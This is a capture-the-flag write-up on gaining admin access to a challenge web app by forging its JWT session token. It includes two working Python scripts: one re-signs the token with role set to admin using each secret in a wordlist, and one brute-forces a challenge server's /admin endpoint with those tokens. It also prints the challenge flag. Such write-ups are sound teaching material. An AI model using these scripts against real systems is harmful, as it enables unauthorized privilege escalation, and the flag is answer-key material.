## Question
Now that you have access to the user panel, try to get admin access. Note: you may need to brute froce something. Here is the wordlist you can use.

## Solution
Now we've logged in as KevinM, we need admin access. Using devtools we see that there's a jwt which when decoded shows this.
![image](https://github.com/user-attachments/assets/0068ff62-ebb0-4413-a931-c43c675ea2ee)

Our aim is to change the role to admin and enter a correct signature.
They've given a wordlist containing a list of words which we can use to encode it in the JWT.
Writing two scripts, one to encode all the JWTs with the words-

```python
import jwt

jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IktldmluTSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzQyNzkwNjg4LCJleHAiOjE3NDI3OTQyODh9.kli2TBZUv6G91qypOs8yS_WMfV02z5urlEUtfhU_vGQ"

wordlist_path = r"C:\Users\rish9\Documents\programs\ctf scripts\password.txt"

def extract_payload(jwt_token):
    """Decodes JWT without verifying the signature."""
    try:
        decoded = jwt.decode(jwt_token, options={"verify_signature": False})
        if "role" in decoded:
            decoded["role"] = "admin"
            print("[*] Role changed from 'user' to 'admin'.")
        else:
            print("[-] No 'role' field found in JWT.")
        
        return decoded
    except jwt.DecodeError:
        print("[-] Invalid JWT format!")
        exit(1)

payload = extract_payload(jwt_token)

try:
    with open(wordlist_path, "r", encoding="utf-8") as wordlist_file:
        words = [line.strip() for line in wordlist_file if line.strip()]

    print(f"[*] Loaded {len(words)} words from {wordlist_path}")

    for secret in words:
        new_jwt = jwt.encode(payload, secret, algorithm="HS256")
        print(f"[+] Secret: {secret} -> JWT: {new_jwt}")
        with open("jwt.txt", "a", encoding="utf-8") as jwt_file:
            jwt_file.write(new_jwt+"\n")

except FileNotFoundError:
    print(f"[-] Error: Wordlist file '{wordlist_path}' not found!")
except Exception as e:
    print(f"[-] Error: {str(e)}")
```

and another to go to `/admin` endpoint and verify which JWT works-
```python
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://188.245.212.74:10037/admin"
tokens_file = r"C:\Users\rish9\Documents\programs\ctf scripts\jwt.txt"
invalid_message = "Invalid token"
max_threads = 10
def check_token(token):
    """Sends a request with the token and checks the response."""
    cookies = {"token": token}
    try:
        response = requests.get(url, cookies=cookies, timeout=5)
        if invalid_message not in response.text:
            return token, response.text  
    except requests.RequestException as e:
        return None, f"HTTP Error: {str(e)}"
    return None, None  

def test_tokens():
    try:
        with open(tokens_file, "r", encoding="utf-8") as file:
            tokens = [line.strip() for line in file if line.strip()]

        print(f"[*] Loaded {len(tokens)} JWTs from {tokens_file}")
        print(f"[*] Running with {max_threads} threads...\n")

        
        with ThreadPoolExecutor(max_threads) as executor:
            future_to_token = {executor.submit(check_token, token): token for token in tokens}

            for i, future in enumerate(as_completed(future_to_token)):
                token = future_to_token[future]
                try:
                    valid_token, response_text = future.result()
                    if valid_token:
                        print(f"\n[+] SUCCESS! Valid Token Found: {valid_token}")
                        print("[+] Response Content:")
                        print(response_text)  
                        executor.shutdown(wait=False)  
                        return
                except Exception as e:
                    print(f"[-] Error checking token: {str(e)}")

                print(f"[-] {i+1}/{len(tokens)} Tokens Checked", end="\r")  

        print("\n[-] No valid token found in the list.")

    except FileNotFoundError:
        print(f"[-] Error: File '{tokens_file}' not found!")
    except Exception as e:
        print(f"[-] Unexpected Error: {str(e)}")





if __name__ == "__main__":
    start_time = time.time()
    test_tokens()
    print(f"\n[*] Completed in {time.time() - start_time:.2f} seconds.")
```

We get a valid JWT and when changed in the devtools we get the flag.
![image](https://github.com/user-attachments/assets/193f25dc-efff-4648-a0d8-d41f13e398ba)

flag: `ping{Spr1n7_T3ch_@dm1n_fl@G}`

